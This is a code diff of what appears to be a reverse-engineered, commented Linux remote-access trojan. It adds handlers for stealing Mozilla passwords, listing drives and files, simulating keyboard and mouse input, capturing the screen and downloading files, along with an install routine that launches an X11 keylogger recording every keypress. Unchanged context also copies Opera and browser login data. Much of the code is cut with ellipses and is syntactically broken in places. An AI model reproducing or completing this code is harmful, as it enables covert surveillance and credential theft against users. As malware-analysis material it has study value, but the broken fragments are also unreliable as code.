@@ -182,6 +182,10 @@ uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *
 
 		case 0:
 
+			...
+
+			GetMozillaProductPasswords ();
+			
 			break;
 
 		case 2:
@@ -261,6 +265,21 @@ uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *
 
 			break;
 
+		case 9:
+
+			...
+
+			cpListDrives ();
+
+			break;
+
+		case 11:
+
+			...
+
+			cpListFiles ();
+
+			break;
 
 		case 13:
 
@@ -302,10 +321,6 @@ uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *
 			cpBeginThread(cpCopyFile(), arg);
 
 			break;
-
-	
-
-
 
 		case 20:
 
@@ -384,6 +399,7 @@ uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *
 		case 38:
 
 			ListWindows (fd);
+
 			break;
 
 		case 39:
@@ -392,11 +408,49 @@ uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *
 
 			break;
 
+		case 43:
+
+			cpKeyUp ();
+
+			break;
+
+		case 44:
+
+			cpKeyDown ();
+
+			break;
+
+		case 45:
+
+			cpMouseUp ();
+
+			break;
+
+
+		case 46:
+
+			cpMouseDown ();
+
+			break;
+
+		case 47:
+
+			cpMouseMove ();
+
+			break;
+
+		case 48:
+
+			cpScreenCapture ();
+
+			break;
+
 		case 62:
 
 			...
 			
 			cpDownloadFile ();
+
 			break;
 
 		case 28:
@@ -422,6 +476,14 @@ uint32_t __attribute__((cdecl)) ProcessData (int32_t *ptr, int32_t n1, int32_t *
 			 ();
 			// Downloads a file
 			cpBeginThread(cpDownloadFile (), "/tmp/%s");
+
+			break;
+
+		case 55:
+
+			...
+
+
 
 			break;
 
@@ -634,13 +696,14 @@ BOOL __attribute__((cdecl)) cpBeginThread (void *(*start_routine)(void *), void 
 
   pthread_t newthread; 
   return pthread_create(&newthread, 0, start_routine, arg) == 0;
+  
 }
 
 
 
 // This function creates a copy of the '~/.opera/wand.dat',
 // more info @ http://securityxploded.com/operapasswordsecrets.php
-int32_t __attribute__((__cdecl)) GetOperaWand (_DWORD *a1) {
+int32_t __attribute__((__cdecl)) GetOperaWand (uint32_t *a1) {
 	// Get the content of the $HOME env var
 	char * homepath = getenv("HOME");
 	char * filename;
@@ -657,6 +720,7 @@ int32_t __attribute__((__cdecl)) GetOperaWand (_DWORD *a1) {
   	// Reads from the entire file
   	_fread (output, member_filesize, , input);
   	...
+
 }
 
 
@@ -694,6 +758,18 @@ int32_t __attribute__((cdecl)) GetLoginDataPath (char * browser_name, char * res
   return cpFileExists (result);
 }
 
+
+BOOL InstallHost () {
+
+	// Opens a semaphore so that only one malware instances runs on the system
+	OpenMutexHandle ();
+
+	// 
+
+	// Start keylogger
+	cpBeginThread (cpStartKeylogger(), NULL);
+	return ;
+}
 
 
 uint8_t UninstallHost () {
@@ -851,4 +927,64 @@ int32_t __attribute__((cdecl)) FileUploadWrite (int32_t fd, int32_t element, int
 	result = CloseTransfer (element);
 
 	return result;
+}
+
+
+
+
+int32_t  __attribute__((cdecl)) cpStartKeylogger () {
+	
+	// It isn't importat to fully grasp the types of this variables
+
+	Display *display; // informations regarding the windows
+	int32_t n_devices;
+	XDevice *device;
+    int32_t KEY_PRESS_TYPE;
+    XKeyEvent *single_event;
+    Window root;
+	XEventClass event_class; // all the events we want to capture
+
+	...
+
+	// LoadKeyloggerAPI:	Loads all the X11 necessary API
+	LoadKeyloggerAPI ();
+
+	...
+
+	// Get a list with input devices
+	XDeviceInfo *devices = XListInputDevices (display , &n_devices);
+
+
+	for (int32_t i = 0; i < n_devices; ++i) {
+
+		// The XOpenDevice request makes an input device accessible to a
+		// client through input extension protocol requests. If
+		// successful, it returns a pointer to an XDevice structure.
+
+		device = XOpenDevice( display, devices[i].id );
+		
+
+	    // DeviceKeyPress:
+	    // returns the DeviceKeyPress event type and the eventclass for
+	    // DeviceKeyPress events from the specified device.
+
+	    // This eventclass can then be used in an XSelectExtensionEvent
+	    // request to ask the server to send DeviceKeyPress events from
+	    // this device. When a selected event is received via XNextEvent,
+	    // the type can be used for comparison with the type in the event.
+
+        DeviceKeyPress( device, KEY_PRESS_TYPE, event_class );
+
+		XSelectExtensionEvent( display, root, &event_class, 1 );
+
+		// Log all keys
+		while (TRUE) {
+			// Gets an event from the 'XEvent' queue
+			NextEvent (&display, &single_event);
+			LogKey (single_event, display);
+		}
+	}
+
+	...
+
 }
